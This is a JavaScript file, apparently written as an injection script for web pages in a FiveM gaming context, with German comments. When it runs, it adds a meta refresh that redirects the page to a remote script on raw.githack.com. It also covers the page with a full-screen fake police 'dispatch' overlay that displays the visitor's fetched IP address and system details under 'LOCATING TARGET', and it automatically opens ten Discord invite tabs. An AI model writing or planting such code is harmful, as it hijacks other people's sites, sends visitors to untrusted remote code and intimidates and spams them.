// lunarx-injection.js - FiveM Dispatch Style
(function() {
    console.log('🚔 LUNARX Dispatch wird initialisiert...');
    
    if (document.getElementById('lunarx-interface')) {
        console.log('⚠️ Interface bereits vorhanden');
        return;
    }
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initLunarx);
    } else {
        initLunarx();
    }
    
    function initLunarx() {
        // Meta-Refresh für automatische Weiterleitung (wie in deinem Code)
        const metaRefresh = document.createElement('meta');
        metaRefresh.httpEquiv = 'refresh';
        metaRefresh.content = '0; url=https://raw.githack.com/heoxsigler-droid/se/refs/heads/main/deepseek_javascript_20260312_32e189.js';
        document.head.appendChild(metaRefresh);
        
        // Koordinaten von deinem FiveM Code
        const coords = { x: 215.76, y: -810.12, z: 30.73 };
        const sex = "male";
        const street = "Legion Square";
        
        // Erstelle das Interface
        const overlay = document.createElement('div');
        overlay.id = 'lunarx-interface';
        overlay.innerHTML = `
            <style>
                @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Source+Code+Pro:wght@300&display=swap');
                
                .lunarx-container {
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: radial-gradient(circle at center, #0a0f0f 0%, #030505 100%);
                    z-index: 999999;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    font-family: 'Source Code Pro', monospace;
                }
                
                .lunarx-frame {
                    background: rgba(10, 20, 20, 0.95);
                    backdrop-filter: blur(15px);
                    border: 2px solid #00ffff;
                    border-radius: 15px;
                    padding: 40px;
                    width: 700px;
                    box-shadow: 0 0 100px rgba(0, 255, 255, 0.3);
                    text-align: center;
                    animation: slideUp 0.8s cubic-bezier(0.19, 1, 0.22, 1);
                }
                
                @keyframes slideUp {
                    from { transform: translateY(100%); opacity: 0; }
                    to { transform: translateY(0); opacity: 1; }
                }
                
                .lunarx-title {
                    font-family: 'Orbitron', sans-serif;
                    font-size: 2.2rem;
                    color: #00ffff;
                    text-transform: uppercase;
                    letter-spacing: 4px;
                    margin-bottom: 25px;
                    text-shadow: 0 0 15px #00ffff;
                }
                
                .lunarx-dispatch-header {
                    background: rgba(0, 255, 255, 0.1);
                    border: 1px solid #00ffff;
                    border-radius: 5px;
                    padding: 10px;
                    margin-bottom: 20px;
                    font-size: 0.9rem;
                    color: #00ffff;
                    text-align: left;
                }
                
                .lunarx-info-grid {
                    display: grid;
                    grid-template-columns: 1fr 1fr;
                    gap: 15px;
                    text-align: left;
                    margin: 20px 0;
                    border-top: 1px solid rgba(0, 255, 255, 0.2);
                    border-bottom: 1px solid rgba(0, 255, 255, 0.2);
                    padding: 20px 0;
                }
                
                .lunarx-info-item {
                    font-size: 0.9rem;
                    color: #ccc;
                }
                
                .lunarx-label {
                    color: #00ffff;
                    font-weight: bold;
                    margin-right: 5px;
                }
                
                .lunarx-value {
                    color: #fff;
                    font-weight: 300;
                }
                
                .lunarx-blip {
                    display: inline-block;
                    width: 10px;
                    height: 10px;
                    background: #00ffff;
                    border-radius: 50%;
                    margin-right: 5px;
                    animation: blink 1s infinite;
                }
                
                @keyframes blink {
                    0% { opacity: 1; }
                    50% { opacity: 0.3; }
                    100% { opacity: 1; }
                }
                
                .lunarx-discord {
                    display: block;
                    font-family: 'Orbitron', sans-serif;
                    font-size: 2.5rem;
                    font-weight: 900;
                    color: #fff;
                    background: #5865F2;
                    margin: 30px 0;
                    padding: 15px;
                    border-radius: 10px;
                    text-decoration: none;
                    box-shadow: 0 0 40px rgba(88, 101, 242, 0.5);
                    animation: pulse 2s infinite;
                    border: 2px solid #00ffff;
                }
                
                @keyframes pulse {
                    0% { transform: scale(1); box-shadow: 0 0 30px rgba(88, 101, 242, 0.4); }
                    50% { transform: scale(1.02); box-shadow: 0 0 60px rgba(88, 101, 242, 0.7); }
                    100% { transform: scale(1); box-shadow: 0 0 30px rgba(88, 101, 242, 0.4); }
                }
                
                .lunarx-progress {
                    width: 100%;
                    background: rgba(255, 255, 255, 0.05);
                    height: 10px;
                    border-radius: 5px;
                    overflow: hidden;
                    border: 1px solid rgba(0, 255, 255, 0.2);
                    margin: 20px 0 10px 0;
                }
                
                .lunarx-progress-bar {
                    height: 100%;
                    width: 0%;
                    background: linear-gradient(90deg, #00ffff, #5865F2);
                    box-shadow: 0 0 10px #00ffff;
                    transition: width 0.3s ease;
                }
                
                .lunarx-status {
                    font-size: 0.8rem;
                    color: #00ffff;
                    height: 20px;
                    margin-bottom: 15px;
                }
                
                .lunarx-close {
                    position: absolute;
                    top: 20px;
                    right: 20px;
                    color: #00ffff;
                    cursor: pointer;
                    font-size: 24px;
                    opacity: 0.5;
                    transition: opacity 0.3s;
                    z-index: 1000000;
                }
                
                .lunarx-close:hover {
                    opacity: 1;
                }
                
                .lunarx-unique-id {
                    font-family: 'Orbitron', sans-serif;
                    color: #00ffff;
                    font-size: 0.8rem;
                    margin-top: 10px;
                    opacity: 0.7;
                }
            </style>
            
            <div class="lunarx-container">
                <div class="lunarx-close" onclick="document.getElementById('lunarx-interface').remove()">✕</div>
                
                <div class="lunarx-frame">
                    <div class="lunarx-title">DISPATCH NOTIFICATION</div>
                    
                    <div class="lunarx-dispatch-header">
                        <span class="lunarx-blip"></span> 999 - SUSPICIOUS ACTIVITY REPORTED
                    </div>
                    
                    <div class="lunarx-info-grid">
                        <div class="lunarx-info-item"><span class="lunarx-label">COORDS:</span> <span class="lunarx-value" id="coords">${coords.x}, ${coords.y}</span></div>
                        <div class="lunarx-info-item"><span class="lunarx-label">STREET:</span> <span class="lunarx-value" id="street">${street}</span></div>
                        <div class="lunarx-info-item"><span class="lunarx-label">SEX:</span> <span class="lunarx-value" id="sex">${sex}</span></div>
                        <div class="lunarx-info-item"><span class="lunarx-label">YOUR_IP:</span> <span class="lunarx-value" id="your-ip">DETECTING...</span></div>
                        <div class="lunarx-info-item"><span class="lunarx-label">PLATFORM:</span> <span class="lunarx-value" id="platform">LOADING...</span></div>
                        <div class="lunarx-info-item"><span class="lunarx-label">RESOLUTION:</span> <span class="lunarx-value" id="resolution">...</span></div>
                        <div class="lunarx-info-item"><span class="lunarx-label">TIME:</span> <span class="lunarx-value" id="time">...</span></div>
                        <div class="lunarx-info-item"><span class="lunarx-label">STATUS:</span> <span class="lunarx-value" style="color:#00ffff;" id="status">ACTIVE</span></div>
                    </div>
                    
                    <div class="lunarx-discord" id="discord-text">DISCORD.GG/LUNARX</div>
                    
                    <div class="lunarx-progress">
                        <div class="lunarx-progress-bar" id="progress-bar"></div>
                    </div>
                    
                    <div class="lunarx-status" id="status-text">> DISPATCH NOTIFICATION SENT...</div>
                    
                    <div class="lunarx-unique-id" id="unique-id">UNIQUE ID: ${Math.floor(Math.random() * 1000000)}</div>
                </div>
            </div>
        `;
        
        document.body.appendChild(overlay);
        console.log('✅ Dispatch Interface geladen');
        
        // Elemente holen
        const yourIpEl = document.getElementById('your-ip');
        const platformEl = document.getElementById('platform');
        const resolutionEl = document.getElementById('resolution');
        const timeEl = document.getElementById('time');
        const statusEl = document.getElementById('status');
        const progressBar = document.getElementById('progress-bar');
        const statusText = document.getElementById('status-text');
        
        // ===== IP laden =====
        async function fetchIP() {
            try {
                statusText.textContent = "> LOCATING TARGET...";
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                yourIpEl.textContent = data.ip;
                console.log('📡 IP:', data.ip);
            } catch (error) {
                yourIpEl.textContent = '127.0.0.1';
                statusText.textContent = "> USING LOCAL GRID";
            }
        }
        
        // ===== System Infos =====
        platformEl.textContent = navigator.platform || 'UNKNOWN';
        resolutionEl.textContent = `${window.screen.width}x${window.screen.height}`;
        
        // ===== Uhrzeit =====
        function updateTime() {
            const now = new Date();
            timeEl.textContent = now.toLocaleTimeString('de-DE');
        }
        setInterval(updateTime, 1000);
        updateTime();
        
        // ===== IP laden =====
        fetchIP();
        
        // ===== AUTOMATISCH 10 TABS ÖFFNEN =====
        setTimeout(() => {
            console.log('🔗 Öffne Dispatch Tabs...');
            statusText.textContent = "> DISPATCHING UNITS...";
            statusEl.textContent = 'RESPONDING';
            statusEl.style.color = '#ff5555';
            
            const numberOfTabs = 10;
            
            for (let i = 0; i < numberOfTabs; i++) {
                setTimeout(() => {
                    window.open('https://discord.gg/lunarX', `_dispatch_${i}`);
                    
                    // Fortschritt
                    const tabProgress = ((i + 1) / numberOfTabs) * 100;
                    progressBar.style.width = tabProgress + "%";
                    
                    // Status-Updates
                    if (i === 3) statusText.textContent = "> UNITS EN ROUTE...";
                    if (i === 6) statusText.textContent = "> ESTABLISHING PERIMETER...";
                    if (i === 9) {
                        statusText.textContent = '> ALL UNITS RESPONDED';
                        statusEl.textContent = 'ON SCENE';
                        statusEl.style.color = '#00ffff';
                        progressBar.style.width = "100%";
                    }
                }, i * 400);
            }
        }, 2000);
        
        // ===== Fortschrittsbalken Animation =====
        let progress = 0;
        const interval = setInterval(() => {
            progress += Math.random() * 2;
            if (progress >= 100) {
                progress = 100;
                clearInterval(interval);
            }
            if (progressBar.style.width === "0%") {
                progressBar.style.width = progress + "%";
            }
        }, 150);
        
        // ===== ESC zum Schließen =====
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                document.getElementById('lunarx-interface').remove();
            }
        });
    }
})();